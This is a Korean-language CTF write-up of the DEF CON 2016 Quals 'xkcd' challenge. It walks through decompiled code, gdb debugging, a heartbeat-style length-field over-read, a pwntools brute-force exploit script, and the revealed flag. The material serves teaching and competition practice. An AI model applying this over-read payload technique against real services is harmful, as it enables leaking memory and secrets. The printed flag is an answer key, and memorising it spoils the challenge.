---
title: "Baby's First) xkcd"
sidebar_position: 1
---
## **Information**

### **Description**
```
<http://download.quals.shallweplayaga.me/be4bf26fcb93f9ab8aa193efaad31c3b/xkcd>

xkcd\_be4bf26fcb93f9ab8aa193efaad31c3b.quals.shallweplayaga.me:1354

Might want to read that comic as well... 1354
```

### **File**

* [xkcd](/attachments/1147090/1147089.bin)

### **Source Code**

* <https://github.com/legitbs/quals-2016/tree/master/xkcd>

## **Writeup**

### File information

```
lazenca0x0@ubuntu:~/CTF/DEFCON2016/baby's/xkcd$ file xkcd
xkcd: ELF 64-bit LSB  executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, not stripped
lazenca0x0@ubuntu:~/CTF/DEFCON2016/baby's/xkcd$ checksec --file xkcd
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH  FORTIFY Fortified Fortifiable  FILE
No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   Yes 2       40  xkcd
lazenca0x0@ubuntu:~/CTF/DEFCON2016/baby's/xkcd$
```

### **Binary analysis**

#### **Main**

* 해당 함수는 다음과 같은 기능을 합니다.
  + fopen(), fread()를 이용해 "flag" 파일을 내용을 읽습니다.
  + fgetln()함수를 이용해서 사용자로 부터 문자열을 입력받습니다.
* 다음과 같이 입력받은 값이 해당 프로그램이 원하는 내용과 같은지 확인합니다.

**해당 프로그램이 원하는 내용**
|  |  |
| --- | --- |
| 문자열의 첫번째 부터 ? 까지의 내용 | "SERVER, ARE YOU STILL THERE" |
| ? 부터 " 까지의 내용 | " IF SO, REPLY " |

* 또 다시 문자열에서 " 에서 " 까지 문자열을 자고, 해당 문자열의 길이를 얻습니다.
  + 해당 문자열을 memcpy()함수를 이용해 globals 변수에 복사합니다.
* 그리고 ( 와 ) 문자 사이에 문자열을 자르며, 해당 문자열의 형태는 다음과 같습니다.

**( 와 ) 사이에 있어야 할 문자열의 형태**

* "(숫자) LETTERS"

* sscanf()함수를 이용해 해당 문자열에서 숫자 값을 num에 저장합니다.  
  + 해당 값은 globals 배열에서 num이 가리키는 자리에 0을 저장합니다
* 그리고 globals의 내용은 globals에 저장된 문자열의 길이가 num 보다 작거나 같으면 내용을 출력합니다.

```c title="main"
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 lenStrtok; // rax@10
  unsigned __int64 num_1; // rbx@10
  const char **v7; // [rsp+0h] [rbp-40h]@1
  int lenLine; // [rsp+10h] [rbp-30h]@4
  int num; // [rsp+14h] [rbp-2Ch]@10
  char *ptrStr; // [rsp+18h] [rbp-28h]@4 MAPDST
  char *line; // [rsp+20h] [rbp-20h]@4
  __int64 ptrFile; // [rsp+28h] [rbp-18h]@1

  v7 = argv;
  setvbuf(stdout, 0LL, 2LL, 0LL);
  setvbuf(stdin, 0LL, 2LL, 0LL);
  bzero(&gContentOfFile, 256LL);
  ptrFile = fopen64("flag", &mode);
  if ( ptrFile )
  {
    fread(&gContentOfFile, 1LL, 256LL, ptrFile);
    while ( 1 )
    {
      line = (char *)(signed int)fgetln(stdin, &lenLine);
      ptrStr = (char *)(signed int)strtok(line, "?");
      if ( (unsigned int)strcmp_0(ptrStr, "SERVER, ARE YOU STILL THERE") )
        break;
      ptrStr = (char *)(signed int)strtok(0LL, "\"");
      if ( (unsigned int)strcmp_0(ptrStr, " IF SO, REPLY ") )
      {
        puts((__int64)"MALFORMED REQUEST");
        exit(0xFFFFFFFFLL);
      }
      LODWORD(ptrStr) = (unsigned __int64)strtok(0LL, "\"");
      ptrStr = (char *)(signed int)ptrStr;
      lenStrtok = strlen((signed int)ptrStr);
      memcpy(globals, ptrStr, lenStrtok);
      ptrStr = (char *)(signed int)strtok(0LL, "(");
      ptrStr = (char *)(signed int)strtok(0LL, ")");
      _isoc99_sscanf((__int64)ptrStr, (__int64)"%d LETTERS", &num, v7);
      globals[num] = 0;
      num_1 = num;
      if ( num_1 > strlen(globals) )
      {
        puts((__int64)"NICE TRY");
        exit(0xFFFFFFFFLL);
      }
      puts((__int64)globals);
    }
    puts((__int64)"MALFORMED REQUEST");
    exit(0xFFFFFFFFLL);
  }
  puts((__int64)"Could not open the flag.");
  return -1;
}
```

### Debuging

#### **gContentOfFile & globals**

* Break point

```c title="Breakpoint"
gdb-peda$ b *0x400FFD
Breakpoint 1 at 0x400ffd
gdb-peda$ b *0x4010E0
Breakpoint 2 at 0x4010e0
```

* 디버깅을 통해 확인한 정보는 다음과 같습니다.
  + gContentOfFile : 0x6b7540
  + globals : 0x6b7340
  + gContentOfFile - globals = 0x200(512)
* 즉, globals, num 값을 이용해 flag string을 출력 할 수 있습니다.

```c title="Debuging"
Breakpoint 1, 0x0000000000400ffd in main ()
gdb-peda$ i r edi
edi            0x6b7540	0x6b7540
gdb-peda$ c
Continuing.
SERVER, ARE YOU STILL THERE? IF SO, REPLY "AAAAAAAAAA" (10 LETTERS)

Breakpoint 2, 0x00000000004010e0 in main ()
gdb-peda$ i r edi
edi            0x6b7340	0x6b7340
gdb-peda$ p d 0x6b7540 - 0x6b7340
No symbol "d" in current context.
gdb-peda$ p/d 0x6b7540 - 0x6b7340
$1 = 512
gdb-peda$ x/4gx 0x6b7540
0x6b7540 <globals+512>:	0x67616c6620656854	0x336c62203a736920
0x6b7550 <globals+528>:	0x336820676e696433	0x0000000a35747234
gdb-peda$
```

### Exploit plan

:::note [Description]
* 다음과 같은 문자열 형태를 이용합니다.
  * SERVER, ARE YOU STILL THERE? IF SO, REPLY \"%s\" (%d LETTERS)
  * %S 에 문자 512개를 채웁니다.
  * %d에 문자열의 끝자리 값을 입력합니다.
  * 문자열의 끝을 찾기 위해 512를 기준으로 1씩 증가 시킨 값을 입력해 문자열의 끝을 찾습니다.  
:::

* The following information is required for an attack:

:::note[Check point]
* N/a
:::

## **Exploit Code**

```python title="Exploit Code"
from pwn import *
 
flag = ''
 
for count in xrange(0,256):
    p = process("./xkcd")
    exploit = 'SERVER, ARE YOU STILL THERE? IF SO, REPLY \"%s\" (%d LETTERS)' % ('A'*512, 512 + count)
    p.sendline(exploit)
    content = p.recv()
    if('NICE TRY' in content):
        break
 
    flag = content[512:]
 
log.info('Flag : {}'.format(flag))
```

## **Flag**

|  |  |
| --- | --- |
| Flag | The flag is: bl33ding h34rt5 |

## **Related Site**

* <https://djsec.wordpress.com/2016/05/23/defcon-ctf-quals-2016-xkcd/>
* <http://sibears.ru/labs/DEF-CON-CTF-Quals-2016-xkcd/>
* <https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2016/DEFCONCTF/babysfirst/xkcd>